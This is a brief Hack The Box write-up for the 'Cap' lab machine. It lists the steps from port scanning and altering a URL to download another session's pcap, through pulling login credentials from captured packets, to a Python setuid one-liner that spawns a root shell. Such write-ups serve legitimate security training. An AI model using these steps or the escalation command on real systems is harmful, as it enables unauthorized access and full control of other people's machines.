Hack The Box Challenge Writeup: "Cap"
Challenge Information:
Name: Cap
Platform: Hack The Box
Category: Privilege Escalation

Step 1: Connect to the Target
Start by connecting to the VPN and accessing the machine:

sudo openvpn lab_itspavit.ovpn
Verify the connection by pinging the target machine:
ping -c 4 <target-ip>

Once the target is accessible use nmap to look for open ports. It shows 3 (SSH, HTML, FTP)

Step 2: open the target ip html page

go to security snapshot tab and switch the url to <ip address>/data/0

download the pcap and analyze it using wireshark

look at packets 36 and 38 to find the username and password

Step 3: ssh using the information to login into the server

use ls -la 

and cat user.txt to reveal the first flag

Step 4: use "getcap -r / 2>/dev/null" to reveal hidden binaries

Step 5: /usr/bin$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
run the python script to get root priveleges

Step 6: After getting root access use cd /root and then cat root.txt to reveal the flag